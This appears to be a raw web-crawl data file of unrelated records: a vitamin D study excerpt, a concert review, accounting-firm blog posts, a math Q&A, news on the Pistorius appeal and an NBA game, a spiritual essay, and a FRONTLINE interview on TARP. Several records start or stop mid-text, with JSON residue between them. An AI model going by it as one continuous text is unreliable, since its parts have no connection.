maintain an adequate level of vitamin D is an emerging essential domain among the primary care physicians and is imperative to improve public health.\nThe main strength of the study was that it was conducted among women from the rural community and multistage random sampling, along with design effect was used to arrive at an apt sample size with generalizability of results. The study investigated 25OH Vitamin D, which is the most sensitive indicator for an individual's vitamin D status. However, the study had limitations of its own. As it was a cross-sectional study, temporal association could not be established. Body parts and their relation to sun exposure could not be assessed. Further, due to limited funds, the researchers were unable to conduct investigations like serum calcium, alkaline phosphatase, and Parathyroid Hormone (PTH), which are all important functional indicators of vitamin D status.\nThe need for improving the levels of vitamin D among the female population is both important and urgent. Emphasis must be given on promoting consumption of vitamin D rich foods and vitamin D supplements. They should also be encouraged to engage themselves in outdoor activities to increase exposure to sunlight. Women should be educated on the importance of maintaining optimum body weight and strict adherence to diabetes prevention and control measures. At the policy level, the provision for early diagnosis of vitamin D deficiency, framing of population-based programs to provide affordable vitamin D supplements, and vitamin D fortified food will help improve the situation at large.\nLongo DL, Fauci AS, Kasper DL, Hauser SL, Jameson J, Loscalzo J. eds.

It included assistance in identifying improvements to the existing public transport infrastructure and operations as well as the establishment of a legal/regulatory regime for Cuenca's privately operated transit system, with the aim to ensure the long-term sustainability of the city's privately operated but publicly regulated public transport system. PADECO, the leader of the consortium, was responsible for carrying out the three main components of the study: (i) inventory of the existing bus-based public transportation system; (ii) formulation of an operational plan for the public transportation system; and (iii) formulation of a municipal institutional structure for the public transportation system.\nTo Search List\n\u30db\u30fc\u30e0>HOME>Projects>Search List>Sustainable Transit System Plan for a Pilot City, Cuenca", "meta": {"redpajama_set_name": "RedPajamaCommonCrawl"}, "__index_level_0__": 32243}

Having written hits for some of today's biggest artists such as Rihanna, Christina Aguilera, the Backstreet Boys and Cher, the singer arrives in shiny red velveteen blazer, opening the set with Strange, from her third album Lost on You. The chorus creates a harmonious unity amongst the crowd, the feeling that this artist really understands how it feels to be different, not truly fitting in. Playing the harmonica, LP shows she's an expert on the instruments as she is in her vocal arrangements.\nOther People begins with Pergolizzi whistling superbly in tune, a challenging feat to some that she achieves effortlessly. The song is one of heartbreak, and feeling torn up inside; the emotions in the lyrics are truly provocative, reaching into the deep feelings of LP's listeners. There is melancholy in this piece that is reminiscent of the earlier work of No Doubt's Gwen Stefani, in hits such as Don't Speak and 4 in the Morning, the vocals trembling, shaky with emotion.\nSitting down playing to the photographers' wants, the songstress is a natural onstage. Tightrope is performed with the same earnestness as the previous tracks, while she pulls out a long piece of red ribbon, trailing it across. Her lyrics are simple enough, yet they act as the essential element to the formula of her catchy pop hooks. Anyone listening can relate, whatever their gender, orientation, or ethnicity, which makes her music universal. Up Against Me may not have the same intimacy as the recorded version, yet it still speaks out to all, and is a powerful number in which LP doesn't shy away from the personal nature of her writing. Death Valley exhibits itself in an indie pop genre, the vocals still maintaining its power in the high-reaching melodies, the voice not deep but with a hoarseness that is not unlike that of Patti Smith. Muddy Waters befits a film soundtrack, dark and booming, with a measured assurance, while Suspicion is a clear crowd pleaser, the singer-songwriter really owning her songs, masterfully controlling her voice, singing high falsettos, operatic style. Rocking show-stopper No Witness, and When We're High, show LP truly in her element.\nA definitive highlight of the set is Lost on You, the perfect mix of sad romance and love ballad. Interjected with Pergolizzi's bird-like whistles, the song exemplifies how talented the New Yorker is, and how she's able to make great pop tunes for not only her contemporaries but for herself.\nThough there was opportunity for a more interesting set of events on stage, there is undoubtedly a bigger reason for going to a live performance, and that is seeing the musician right there in front of you, which is the feeling LP's performance procured.\nPhotos: Jon Mo\nFor further information and future events visit the LP website here.\nWatch the video for Lost on You here:\nRelated Itemsfeaturedlive musicreview\nMore in Live music\nDoves at Somerset House: A spirited set that leaves the crowd wanting more\nGrace Jones reinforces her iconic status in boundary-pushing show at ONBlackheath 2019\nMusanna Ahmed\nRobbie Williams entertains with a generation-defining setlist at British Summer Time 2019\nFilippo L'Astorina\nJacob Banks at Somerset House\nSylvia Unerman\nCatfish and the Bottlemen provide the perfect summer soundtrack at Citadel 2019\nThe editorial unit\nJamiroquai deliver a dynamic showcase of nostalgic pleasures at ONBlackheath 2019\nJools Holland at Kew the Music: An eclectic musical extravaganza\nEzelle Alblas\nThe Who at Wembley Stadium: A rock opera of epic proportions\nThe Kooks reaffirm their status as indie kings at a sun-drenched Community Festival\nKiss at the O2 Arena in pictures: A farewell to rock's most iconic outfit\nThe Illusionists at Shaftesbury Theatre\nJoseph and the Amazing Technicolour Dreamcoat at London Palladium\nAntwerp to host the World's 50 Best Restaurants awards ceremony in 2020\nSartoria's summer drinks menu with Acqua di Parma provides an idylic immersion into the invigorating flavours of Italy\nThe Night of the Iguana at No\u00ebl Coward Theatre\nEquus at Trafalgar Studios\n\"It was as much the story behind the portrait as the portrait itself that was fascinating\": Stuart Lochhead on the curation of Artists by Artists\nOur London food map\nWhat, when, why\nCopyright \u00a9 2018 FL Media Ltd\nTom Clarke celebrates ten years of We'll Live and Die in These Towns with Shepherd's Bush Empire show featuring James Walsh and Joe Dolman\nThe Secret Theatre at the Sam Wanamaker Playhouse | Theatre review", "meta": {"redpajama_set_name": "RedPajamaCommonCrawl"}, "__index_level_0__": 59329}

{"text": "Big Data is only getting bigger as business usage increases and more companies change the way they look at their processes in 2019. A recent Gartner survey found 62 percent of participants have indicated that their management teams have developed plans or initiatives to increase digital practices and 47% have at least been encouraged to pursue an increase in digital practices. More than analyzing buying patterns or customer relationships, Big Data can allow entrepreneurs to improve their financial forecasting and future trends.\nPredicting company success and finding potential opportunities is a common goal for any entrepreneur. By leveraging real-time/big data metrics, finance teams can gain valuable insight into trends, improving their ability to take advantage of upcoming opportunities or mitigate risk. When considering the benefits, implementing big data metrics does not have to overcomplicate your existing financial reporting methods.\nUtilize the resources you already have in place. Businesses big and small are already housing stores of information in their existing systems, whether through their business or sales management systems. For example, customer relationship management systems hold valuable details about sales, sizing, markets and more than can be referenced across departments. However, all that data means little without the ability to effectively distinguish between what is important and what is just white noise. These details, although large in quantity, can allow forecasts to adjust as events occur if properly utilized.\nDon't be afraid to let go of old technology. The typical Excel spreadsheet forecast focused on historical trends is very limiting when considering how extensive your decision-driving data may be and the way activities affect different parts of your business. These simple documents continue to emphasize the inefficiency of solely using historical data to make future business decisions. By embracing real-time metrics and overall real-time forecasts, entrepreneurs can gain a greater understanding of how specific actions affect their forecasts.\nFrom technology-based accounting solutions to management information, analysis, and reporting, Talley LLP is the premier business consulting firm for entrepreneurs and their closely-held businesses. For more information on how to leverage your business's data technology, contact Talley today.\nWith 2018 fresh in the rear-view mirror, many entrepreneurs and executives are taking time to reflect on what worked and what did not last year. While New Year's Resolutions can act as a catalyst for change in both your personal and professional life, they usually reflect short-term thinking and fall short.\nSo why do resolutions not work? For starters, resolutions tend to be vague and lofty in nature. Some individuals simply don't know where to start and give up immediately. Others lack an executable plan of action to achieve their goals once they get going. And lastly, there are those who don't know how to sustain their goals once they reach them (e.g. keeping the weight off after losing it initially). Sounds familiar? These challenges to resolutions draw many parallels to several critical life cycle stages of a typical business model: Start-Up, Growth, and Stabilization. Each stage comes with its own set of challenges to overcome and opportunities to leverage.\nGiven their abysmal success rate, your company's strategic plan for 2018 and beyond should not take on the flawed form of resolutions. Set goals and milestones instead and pick those that will impact you the most. Here are some pointers we've collected along the way.\nWrite your plan down. While it's great to brainstorm goals, without writing down your mission, focus fades and continuity begins to decrease. Putting pen to paper forces you to identify and define the specific goals that you are working toward.\nBe realistic about your expectations. Whether it's about weight-loss or company growth, setting unattainable goals doesn't help your success, it hampers it. It's better to establish a set of smaller goals that can be expanded upon than something you feel you'll never actually reach. Think about the most important things that will impact your business, and with hard work and effort, you can actually achieve.\nEstablish milestones to track success. A year is a long time to stay focused. Here's where effective planning comes into play. Think about what success looks like in both the short term and long term to keep yourself motivated. Be sure to set key performance indicators for each of the goals you set to make sure you are on track.\nWhether your goal for 2019 is improving the quality or timeliness of financial statements, growth through strategic acquisition, or developing a tax-efficient succession plan, the advisors at Talley are here to help you. Contact us today to see how we can assist you with your strategic goals in 2018.\nGrowing a business takes a certain level of both personal and professional investment to better the likelihood of success. With the nonstop demands that come with running a business, even the most energetic of leaders can get worn down and many entrepreneurs have experienced firsthand how not letting go of the \"CEO of Everything\" mentality can lead to sub-par results. Here are a few ways to keep things in check so you can consistently show up at your best.\nTake a 10,000 foot view. With the daily influx of emails, message pings and phone calls, it's easy to see productivity as a measure of how fast we clear our inboxes and how many items we tick off our to-do lists. These lists are certainly helpful, but the real value CEOs bring to the table doesn't always fit in a series of checkboxes. To fully comprehend crises, challenges and opportunities within a business, CEOs do well to take a 10,000-foot perspective, not just a close-up.\nDon't micro-manage mundane tasks. The surest way to stifle innovation and decrease your own productivity as well as that of your staff and partners\u2014is to micro-manage every task. Eventually, as your business grows, the day-to-day administrative tasks of running an organization will take valuable time away from growing your business. Smart business owners know when it's time to hire help to scale their growth initiatives.\nSystemize and automate as much as possible. Take a closer look at how your business process works, from your marketing process to your customer acquisition to purchase fulfillment and look for ways to make each step easier. Is there a part of your business that slows you down or frustrates you? Find a way to make challenging aspects work on autopilot (or as much as possible) and it will free you up to tackle other responsibilities and make your business run smoother.\nIt's necessary for business leaders to be keenly aware of the goings-on, processes and results in their companies, providing guidance and support where needed. But is it necessary to enter every invoice yourself? Make every social media post? Schedule every vendor meeting? Instead, find team members and service partners who can help you focus what you do best: grow your business.\nTo learn more how Talley can help grow your business, give us a call today.\nFor the entrepreneur, there's usually much more to personal finance than a W-2 employee content to passively funnel money into 401(k)s and IRAs full of mutual funds.\nHere are three key questions to ask yourself when planning for future success.\nAre you taking advantage of all the legally allowed tax savings? The IRS tax code is more than 5,700 pages long (over 75,000+ pages if you count supporting documents like court case rulings). That includes which deductions you can take and which strategies you can implement. Whether it's forgetting to deduct the interest from business loans, paying business items on a personal credit card, not recording self-employed health insurance properly, or forgetting to write-off business transportation taxes, missed deductions add up fast.\nDo you have the capital to take advantage of growth opportunities and to get through hard times? With enough liquidity in your \"back pocket\" you can greatly reward your business and even save it in the future. For example, if the right business opportunity comes along and it requires a capital investment, you'll be able to act quickly. Additionally, if your business hits a rough patch, you won't need to look at financing options to get through the tough times.\nDo you have an estate plan in order? It seems morbid, but it's a vital issue to address. What happens if you're not around anymore? Do you have a succession plan for your business in the event of incapacity or death?\nProper estate planning\u2014deciding on the \"who, what, when, and how\"\u2014and executing this with the least amount paid in taxes, legal fees, and court costs possible is a challenging affair. Start early.\nProper business planning is a complex and on-going effort. It requires expert counsel from a professional with knowledge and experience, one who's familiar with the challenges that characterize an entrepreneur's business ventures.\nTalley shares the same entrepreneurial spirit that has helped propel our clients to their current levels of success. With over 25 years of experience helping high net worth individuals and business owners, Talley has the expertise necessary to assist entrepreneurs throughout their entire journey, from formation through succession.\nA CPA-trained business consultant can give you deeper insight into key decisions made on a regular basis, such as buying or renting office space, hiring independent contractors or full-time employees, renting or leasing equipment, and much more. Here are three questions you might ask to help you get the most out of your relationship.\nWhat Are My Options for Securing Capital for Growth? There are more financing options today than ever before, from equity vs. debt financing, loans, grants, venture capital, angel investing, crowdfunding, peer-to-peer lending, and of course friends, family, and colleagues. Depending on the intended use for the capital, the urgency of the need, the state of your industry, the strength of your management team, and many other factors, experienced advisors can help you assess your financial situation and discover whether one option might suit your needs better than another. The right team can also help you prepare your business to be considered favorably by banks, lenders, and investors when outlining your plan for the next five years and showing what your revenue stream will look like.\nThese are only some of the areas in which Talley LLP advisors can offer business and tax advice throughout the year.

{"text": "Q: omega-categories and n-fold complete segal spaces Why are $n$-fold complete segal spaces or $(\\infty, n)$-categories (which I'm unsure of how to distinguish from omega-categories) important for $n \\geq 3$? Why are they \"badly behaved\" for $n \\geq 3$? (Lurie refers to them this way in his thesis).\nAlso, I'm particularly interested to connections between $n$-fold complete segal spaces with regards to a question asked recently about \"same\" proofs. Is a 2-fold complete segal space sufficient in this particular arena?\n(Please tell me if this question is ill-posed, I'm just currently learning category theory.)\n\nA: $n$-fold complete Segal spaces are one model for $(\\infty,n)$-categories; there are other models.  More precisely, they are supposed to be a model for weak $(\\infty,n)$-categories.\nThe distinction that I think you are asking about is between weak and strict.  Strict $n$-categories can be easily defined by a recursive definition: a strict $n$-category is just a category enriched over strict $(n-1)$-categories.  A strict 1-category is just a plain-old category.  Though easy to define, strict $n$-categories don't seem to capture the things people want an $n$-category to capture.  \nOne such feature is that strict $n$-categories don't satisfy the \"homotopy hypothesis\", which says that an $n$-groupoid ($=n$-category in which all morphisms are in some sense invertible) should model homotopy $n$-types ($=$ spaces whose homotopy groups vanish above dimension $n$).\nIn fact, this failure only occurs for $n \\geq 3$; I believe this is the type of bad behavior Lurie refers to.  Another failure of strict $n$-categories happens when you try to talk about higher monoidal structures.\nIf you haven't already, take a look at the papers by Baez-Dolan on arxiv, which discuss a lot of these issues.\n", "meta": {"redpajama_set_name": "RedPajamaStackExchange"}, "__index_level_0__": 41896}

Further details are given by St. Paul himself. He \"persecuted this way unto the death\" (Acts 22:4). It does not follow, however, that this points to more than the death of Stephen. Both men and women were imprisoned (ibid). The fact that the latter class were included among the sufferers, implies that they had been more or less prominent in the activity of the new society. Such may have been the devout women of Luke 8:2-3. The victims were punished in every synagogue, most probably with the forty stripes save one (2Corinthians 11:24) which was the common penalty for minor offences against religious order. They were compelled to blaspheme the \"worthy name\" of the Master whom they owned as the Christ (Acts 26:11; Jas. Ii. 7). They were subject to wanton outrages in addition to judicial severity (1Timothy 1:13). There was, as the persecutor himself afterwards confessed (Acts 26:11), a kind of insane ferocity in his violence. Even the very word \"haling\" implies a brutality which might well have been spared. . . .\nVerse 3. - But for as for, A.V.; 'laid waste for he made havoc of,' A.V.

{"text": "Pistorius case: Appeal seeks tougher penalty in killing\nCHRISTOPHER TORCHIA and GERALD IMRAY, Associated Press\nJOHANNESBURG \u2013 Prosecutors said today that they will appeal Olympic runner Oscar Pistorius' acquittal on murder charges and five-year sentence on the lesser charge of culpable homicide for killing his girlfriend.\nAs a result, Pistorius could again face being convicted of murder for shooting Reeva Steenkamp, and a minimum of 15 years in prison if he is found guilty. Fifteen years is the minimum sentence for a murder conviction in South Africa.\nPistorius, the 27-year-old double-amputee athlete, was acquitted of murder by Judge Thokozile Masipa last month for shooting Steenkamp multiple times through a toilet cubicle door in his home. He testified he mistook her for a nighttime intruder. Masipa found him guilty instead on a charge comparable to manslaughter.\nToday, the National Prosecuting Authority said in a statement that its decision to appeal was based on a \"question of law,\" meaning it believes that the judge misapplied the law when she acquitted Pistorius of murder.\n\"The merits and the demerits of the NPA's argument \u2026 will become evident when we file papers for leave to appeal,\" the NPA said. \"The prosecutors are now preparing the necessary papers in order to be able to file within the next few days.\"\nChief prosecutor Gerrie Nel and his assistant, Andrea Johnson, had been \"hard at work studying the judgment, researching and also consulting with legal experts with the view to establish whether or not there are sufficient grounds to appeal both the judgment and sentence,\" the NPA said.\nProsecutors have to apply initially to Masipa for permission to appeal within 14 days of Pistorius' Oct. 21 sentencing.\nPistorius' lawyer, Brian Webber, declined to comment. Pistorius' uncle, Arnold Pistorius, released a short family statement: \"We take note of the state's announcement. The law must take its course.\"\nPistorius started serving his prison sentence last week for negligently killing Steenkamp on Feb. 14, 2013. Under the current terms of his sentence, the multiple Paralympic champion is eligible for release after 10 months and would then complete his sentence under house arrest.\nSubstantial grounds for appeal?\nAt the time of the sentencing, prosecutors said they were disappointed with the culpable-homicide conviction and believed they had a strong murder case against Pistorius.\nChief prosecutor Nel laid the groundwork for the decision to appeal, speaking with Prof. James Grant, a criminal law specialist at Johannesburg's University of the Witwatersrand, prosecution spokesman Nathi Mncube said.\nLegal analysts questioned Masipa's decision to acquit Pistorius of murder. Grant, a TV analyst during Pistorius' trial, was among them and said last week that he had advised Nel to appeal. Grant also said he agreed to assist prosecutors.\nExperts say there are grounds for an appeal, partly because the judge may have misapplied a part of the law called \"dolus eventualis\" \u2014 which says someone should be found guilty of murder if they foresaw the possibility of killing someone through their actions and went ahead anyway. The experts questioned how Masipa ruled that Pistorius did not predict that someone might die when he decided to shoot four times from close range into the small toilet cubicle in his Pretoria home, hitting Steenkamp in the hip, arm and head.\nSome experts have also said that Pistorius' argument that he did not know it was his 29-year-old girlfriend in the cubicle might not be enough to save him from a murder conviction as he still knew there was someone in there when he fired his 9 mm pistol.", "meta": {"redpajama_set_name": "RedPajamaCommonCrawl"}, "__index_level_0__": 48676}

However, Milwaukee lost its star player and could be without him the rest of the way.\nGiannis Antetokounmpo left Game 4 with just over seven minutes to go in the third quarter and did not return after he hyperextended his left knee trying to block Clint Capela's shot. The two-time MVP did come back to the bench but had a noticeable limp and returned to the locker room.\nAfter Antetokounmpo's injury, the Hawks, who led the Bucks by 10 when Antetokounmpo went out of the game, outscored the Bucks 25-10 the rest of the third quarter. Atlanta would take a 25-point lead into the fourth quarter and ultimately defeat the Bucks 110-88 at State Farm Arena to tie the series at 2.\nGame 5 is Thursday night in Milwaukee.\nWithout Young, Lou Williams, the three-time 6th-man of the year award winner, got his first career postseason start on Tuesday night, and Williams had a game-high 21 points and eight assists.\n\"When superstar caliber guys go out, you put some other guys in the game, and their eyes are this wide, and they're like this is a great opportunity for me to show and prove my abilities,\" Williams said. \"You don't want to be the guys that let them off the hook because Giannis was off the floor. I think we all felt that energy, and we just ratcheted up our energy and continued to go.\"\nJrue Holiday led the Bucks with 19 points, to go along with nine assists and five rebounds. According to Holiday, without Antetokounmpo, everybody else has to step up.\n\"I think just based off of how he was grabbing his leg, it seemed like it was pretty bad,\" Holiday said. \"So from there, you are concerned, and you don't want to see anybody, especially a teammate, get hurt, but you kind of have to shift to somebody has to step up. Multiple people have to step up.\"\nP.J. Tucker, who had eight points on Tuesday night, added on Antetokounmpo: \"It's not good. Any time you see your best player go down, it's not great. But it's an opportunity for somebody else and everybody else to step up. It's the Eastern Conference finals; there's no excuses. It doesn't matter whoever is playing, not playing. They've got guys out; everybody's hurt, everybody's banged up, everybody has injuries. You have to fight through it and win.\"\nCredit to Atlanta for the way they played in Game 4. They came out with more passion and energy than the Bucks, which is why they were able to tie this series at 2.\nAccording to reports, Antetokounmpo is expected to get an MRI on Wednesday, so what happens with that MRI could determine how the rest of this series plays out. Depending on how things go with Young's injury, both teams could be without their best player in Game 5.\nBogdan Bogdanovic, who has been battling right knee soreness throughout the playoffs, had a breakout game for the Hawks. He scored 20 points(6-14 from downtown) on Tuesday night.\nBefore Game 4, Bogdanovic scored 20 points in the first three games of this series combined.\nPrevious Post Three heavyweight bouts added to Fury-Wilder III undercard\nNext Post Conlan-Doheny set for August 6 in Belfast", "meta": {"redpajama_set_name": "RedPajamaCommonCrawl"}, "__index_level_0__": 75929}
{"text": "If you had to choose an object today that described your spiritual life, what would it be? This question, and our hearts response, help us find language for the great mystery of our life in God. As I ponder this question for my own life, the object I choose is a boat's sail.\nI know the most wondrous moment on a sailboat: it is when the sails first find their wind. It happens when you have finished navigating by motor to get out into the open water. You put up the sails, turn off the motor, the wind finds the sail, and the boat responds. And now it is all sail-power. The noise and smell of the engine are gone. You feel part of the boat and the wind, as this vessel moves across the face of the deep.\nThis experience is a teacher for my spiritual journey. With this knowing living in me, I find I am more likely to notice when I am navigating the world with only my motor, my own strength; when I feel it is all up to me and my efforts. Sometimes I forget about the Spirit's part in my life. I forget about the partnership of Spirit. I forget that I am a vessel, and that this vessel has a sail.\nA term used for this kind of motor-only living is functional atheism. It is to believe in the power of God's Spirit in my life, but to function as if I am on my own.\nThe journey is about surrendering to the mystery of God's constant presence. And we are told from the beginning this wind has been forever blowing over the face of our depths, bringing forth life.\nSo I carry my sail in my heart as a reminder. The sail with which I am most familiar, the one from my own boat, is thirty feet high, and at its base fifteen feet long! It is a reminder for me of how abundant and powerful this Spirit is.\nStill, I forget, and use my engine instead.\nI will never forget Fr. Michael Fish's great humility as he shared a piece of his journey with those assembled the night before Stillpoint's one day retreat last Spring. He confessed to us that every time he is scheduled to lead a retreat, a few days before, he is overcome by a dark countenance, a feeling that he has nothing to offer, nothing to say.\nWe sat looking at him in disbelief, thinking to ourselves, \"I know all about that! But you?!\" He said it always happens, and yet it surprises each time. And in this place, he says his ego goes into high gear to fix it. It pushes him to his bookshelf in hopes of finding the fix there. It convinces him what he needs in order to be ready is more hours of work. This is what egos do.\n\"But She always comes. I have come to know that,\" he said. \"She always comes.\"\nAs I sit to write these words I wait for her to come. I listen and I surrender myself to the Source and Partnership of all wisdom. And I try to be compassionate to the part of me that forgets.\nIt requires trust. It means having your sail up so the Spirit can fill her.\nI know engines are not bad, they just keep us at the surface of ourselves and on our own power.\nAnd it is here that companions are needed. We need those who help us remember, those who will listen with us to how it is with our vessel of the Holy Spirit. We benefit from any space and time that tends to the power of the Holy Spirit in which we live and move and have our being.\n\"Sister helps to trim the sail,\" the old spiritual goes, \"Hallelujah!\"\nIf you had to choose an object today that described your spiritual life what would it be?", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 80079}

Bush to be Special Inspector General for the Troubled Asset Relief Program, speaks at a congressional hearing in November 2008. (AP Photo/Haraz N. Ghanbari)\nJason M. Breslow Digital Editor\nWatch Money, Power & Wall Street, FRONTLINE's four-part investigation into the global financial crisis.\n\"By any objective standards, the Trouble Asset Relief Program [TARP] has worked,\" the Treasury Department wrote in a July progress report (PDF) on the $700 billion program that Congress authorized in 2008. \"It helped stop widespread financial panic, it helped prevent what could have been a devastating collapse of our financial system, and it did so at a cost that is far less than what most people expected at the time the law was passed.\"\nNeil Barofsky sees it much differently. From December 2008 to March 2011, Barofsky, a formal federal prosecutor and lifelong Democrat, served as special inspector general of TARP, charged with protecting against abuse and fraud in the program. In his new book about that experience, Bailout, he writes that the American people \"should be enraged by the broken promises to Main Street and the unending protection of Wall Street.\"\nFRONTLINE spoke with Barofsky, now a senior fellow at New York University School of Law, about his time policing TARP. This is an edited transcript of that conversation:\nYou are highly critical of the management of TARP. What went wrong?\nIt's important to remember that there were a number of different objectives for TARP. It did meet one of its primary objectives, which was to help prevent the entire collapse of our financial system. \u2026 The other goals, which have more of a focus on helping Main Street institutions and individuals and businesses definitely small enough to fail \u2014 those goals all came short.\nSo, for example, TARP was supposed to be used by the banks to restore lending, help pump that oxygen into the lifeblood of the economy, and it just didn't happen. One of the reasons why it didn't happen is the money went to the banks with no strings attached, no conditions, no incentives, just essentially piles of money given to them without any instructions whatsoever and sort of this hope that somehow or other they use the money to achieve the policy goals of the administration. Of course, that never happened and you just look at the malaise the economy has been in in the years ever since.\nSimilarly, TARP was supposed to help homeowners, and that was part of the very bargain that was struck in order to get TARP passed. \u2026 We had a housing program that was an utter failure by any definition if you look at what its original goal was \u2014 up to 4 million homeowners helped, and today it's around 800,000, 20 percent of that goal. Or if you look at how much money has been spent, just a small tiny fraction, maybe 6 percent of the original $50 billion, on par with what credit card companies got.\nSo you're sort of left here, almost four years after the bailout, with this tremendous amount of effort and money going to save the banks but all the other goals, really important Main Street goals to help everyone else, just abandoned.\nWhat do you say, though, to those who argue that while the bailouts may not be popular, they did stabilize the banks, as well as the auto sector, for far less money than first feared?\nIt's undoubtedly good news that the losses are less than we originally intended. \u2026 But again, even the saving, or stabilizing the financial system \u2014 to what end? What we've done is essentially preserve a fundamentally broken status quo that led to the financial crisis in 2008, and we took a lot of problems in the system and in some ways made them worse.\nOne of your biggest disappointments was with the Home Affordable Modification Program (HAMP). That was an effort to help people stay in their homes. Why did it fall short?\nIt was cursed from the beginning. As I detailed in the book, it was rushed out before they were ready. I had [a meeting] in February, on a Friday, where I was told they were weeks away from having anything to announce, and then that same night I heard the president was announcing the program in a few days, and they never really caught up. The put the program on backs of mortgage servicers who never had the infrastructure in place to run the program \u2026\n\"Tim Geithner is as much the symptom of the disease as the actual disease.\"\nFundamentally, though, the program was cursed by a lack of commitment by Treasury to use the program to help homeowners as opposed to another way of bailing out the banks. When Secretary Geithner told a group of us in 2009 when he was pressed on how this program [was] ever going to help homeowners, he portrayed what the program was really about. He said that the program was going to \"foam the runaway\" for the banks. He mentioned that the banks could handle a certain number of millions of foreclosures over certain periods of time and that this would help. In essence what we took that comment [to mean] was this was going to help extend out the foreclosure crisis for the benefit of the banks. They wouldn't be hit with all of that at the same time.\nUnfortunately the way Treasury ran the program, that foam was really supplied by the bodies of wrecked homeowners who may have provided a soft landing for the banks, but got absolutely crushed under the weight of this broken program.\nAre there any aspects of TARP you do consider a success?\nIt's a counter-factual. People say, \"Oh we could have been fine without it.\" I mean, we'll never know for sure, but I do know based on my time down there that just about everyone was pretty strongly convinced that this could have been an epic Great Depression had we not done this.\nI think that's an accomplishment. I think the execution of it, though, was absolutely horrible and shortsighted and so focused on the banks with such little focus on everyone else that we're feeling the results of that, and ultimately it may end up setting the groundwork for an even bigger financial crisis in the future.\nYour book is just as much about dysfunction in Washington as it is about TARP. What did you find are the implications of that dysfunction when it comes to effective oversight?\nIt's pretty hopeless. Unless you recognize the flaws of our system and how fundamentally broken our system of regulation is, it's going to remain hopeless. \u2026\nFundamentally we have, on the one hand, the corrupting influence of the megabanks, which have to be broken up. They have such a corrupting influence because of the power, their size, their economic might and also because of the corruption of ideology because of the revolving door. So many of the Treasury officials come from the Wall Street banks they're supposedly regulating. So that's part of the fundamental problem.\nOn the Washington side, in addition to that, you have the problems of regulators who often have incentives not to be really good regulators. The curse there again is partly the revolving door. I was told point blank in 2010 that if I didn't change the harshness of my tone on Wall Street, as well as on the administration, that I was going to be doing me and my family real harm because I wasn't going to have this job forever. If I wanted to get a job on Wall Street or advance within the administration, I needed to soften my tone. I was told that if I did soften my tone, very good things could potentially [follow].\nI obviously didn't take that advice, as this book clearly demonstrates, but that's the decision that's facing a lot of our regulators. You either have people who made their millions on Wall Street and come into government \u2026 or you have folks who look at their bosses who made that money and want to be them. And the path to being like that is rarely by being a tough, effective regulator. It's by rolling with the punches \u2014 rolling over, really, and pulling your punches and trying to get that big job. That's not to say that all regulators do that but that's our incentives and we need to change the incentive structure for regulators.\nYou had a rocky relationship with Treasury Secretary Tim Geithner. One of your criticisms of him is also one that emerged in our film, Money, Power and Wall Street: that he was too close to the banks. In your view, was he then, and is he still, the right man for the job?\nFirst of all, this gets lost sometimes: Tim Geithner is as much the symptom of the disease as the actual disease. And he is just yet another example of a captured government official who, because of fundamentally flawed ideology, puts the interest of Wall Street and a handful of banks over that of Main Street and the broader economy. But he's not alone. He's far from alone.\nDo I think he did a good job as Treasury secretary? No. I think he did a horrible job as Treasury secretary. Again, all you have to do is look at where we are as an economy and look how TARP was essentially hijacked by the interests of Wall Street and failed to fulfill Main Street. The fact that he believed that HAMP was more about helping the banks than it was helping homeowners should have been disqualifying for that job, in my view.\nHis behavior today is entirely consistent with that broken ideology. He's the head of a Financial Stability Oversight Council that has done absolutely nothing to rein in the power of the giant banks. There's been no effort to break them up. He led the effort against a bipartisan Senate effort in 2010 that would have broken up the banks and limited their power. At every critical juncture, he's chosen the side of the banks over that of homeowners and Main Street, so I don't think he's done a good job and I don't think he should still be there.\nYou wrote \"Dodd-Frank may have inadvertently sowed the seeds for the next financial crisis.\" How so?\nIf you look at some of the different causes of the last financial crisis, to me a lot of it comes back to the incentives and perversions of the market and normal capitalism that comes with the presumption of \"too big to fail.\"\nToo big to fail, and by that I mean the presumption of bailouts, the market's general presumption that if one of these large banks gets into trouble again \u2014 or got into trouble beforehand, it was certainly alive and well before the crisis \u2014 the government would bail them out. That results in a complete perversion of capitalism, and what it does is it creates incentives for these large institutions and their executives to pile on risk. It's a very simple \"Heads I win, tails the taxpayer bails me out,\" and it creates incentives for short-term profits, short-term bonuses, and the collection of risk in different areas. And ultimately the bigger the bank, the bigger the incentives are for that risk, and the bigger the danger is and the need for bailout if they get into trouble lest they bring down the entire financial system.\n\"[Megabanks] don't operate by the regular rules because they know, and the regulators know, that any type of severe punishment against them will never happen.\"\nAll you have to do is look at the recent headlines and see that those problems are very, very much still alive, and appear to be getting worse. Because on the one hand you see it through the recent $6 billion loss for JPMorgan Chase, where again, capitalizing and profiting off the government guarantee. They took hundreds of billions of dollars of deposits backed by the United States government and made incredibly risky bets that blew up. That's a direct function of too big to fail.\nSimilarly, you look at the different scandals, whether it's LIBOR, whether it's HSBC ignoring money-laundering laws, whether it's Citi's recent settlement \u2026 these are all symptoms of the banks that are also too big to jail. They don't operate by the regular rules because they know and the regulators know that any type of severe punishment against them will never happen because if you indict one of these banks, again you risk bringing down the entire financial system with them and that puts them above the law. They play by a different set of rules, so you have this combination of incentives to take risks and this complete lack of accountability because of their size and it's a toxic cocktail. We saw it with Fannie and Freddie. We saw it with the too-big-to-fail banks in 2008, and I'm sorry it's just the height of foolishness to think you leave those fundamental incentives in place and think we're not going to have a repeat and another financial crisis.\nWhat kind of reforms would make you feel safe about the health of the financial system?\nIt's very simple. You have to remove the presumption in the market that the banks are too big to fail, which means that they don't play by a different set of rules any more.\nI think there are a lot of potential things that can be done. Breaking up the banks, whether it's through re-enactment of Glass-Steagall, which is a good idea, whether it's through size caps, which was the basis of the SAFE Act, which was proposed by Senators [Sherrod] Brown (D-Ohio) and [Ted] Kaufman (D-Del.), which had bipartisan support before it was defeated by Geithner and the administration, that's a good idea. Remarkably higher capital levels, not the levels that are currently under discussion, but maybe two times that. Really, really going after the problem of leverage. That will help make the banks safer, make it so that it's the shareholders and their executives who bear the losses, not the taxpayers, and take away some of the advantage. All those things are, I think, would be an important part of the necessary reforms.\nWatch the Documentary\nMoney, Power and Wall Street\nSupport Provided By Learn more\nSee What FRONTLINE Is Working On Now\nS.&P. to Pay $1.38 Billion for Once Rave Ratings of Toxic Mortgages\nPioneer Behind Credit Derivatives is Leaving JPMorgan\nThe Financial Crisis Five Years Later \u2014 How It Changed Us\nIn order to foster a civil and literate discussion that respects all participants, FRONTLINE has the following guidelines for commentary.

